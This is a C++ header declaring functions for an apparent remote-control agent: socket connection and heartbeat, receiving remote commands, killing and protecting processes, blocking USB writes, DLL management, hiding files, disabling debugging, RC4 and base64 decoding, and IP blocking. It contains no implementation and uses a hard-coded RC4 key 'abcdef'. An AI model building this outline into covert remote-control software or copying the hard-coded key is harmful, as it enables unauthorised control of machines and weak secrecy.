#pragma once
#include "headers.h"
#define SRC_KEY "abcdef"





void InitSocket();
string GetSysName();
void SendData(char* buf, int datalen);
void HeartBeat();
string GetSysTime();
void GetRemoteConmond();
void SendProcessList();
void NormalKillProcess(char* pid);
void StrongKillProcess(char* pid);
void ProtectProcess(char* pids);
void UnProtectProcess(char* pids);
void DisableUsbToWrite();
void EnableUsbToWrite();
void ReConnect(SOCKET talksocket, sockaddr_in saSrv);
void SendSysName(string ip);
void RC4DecryptForString(const std::string& key, std::string& data);
string base64Decode(const std::string& encoded);
int GetDataRelLenth(char* buf, int length);
void SecondDecode(char* buf, int length);
void AddDll(char* name);
void DelDll(char* name);
void InitDir();
void DeleFiles(string name);
bool SetFileInaccessibleFalse(char* filePath);
bool SetFileInaccessibleTrue(char* filePath);
void DisableDebug();
void EnableDebug();
void DisableAnything();
void EnableAnything();
void QueryDir(const std::string& folderPath);
bool BlockIP(const char* ip);
bool RemoveBlacklistIP(const char* ip);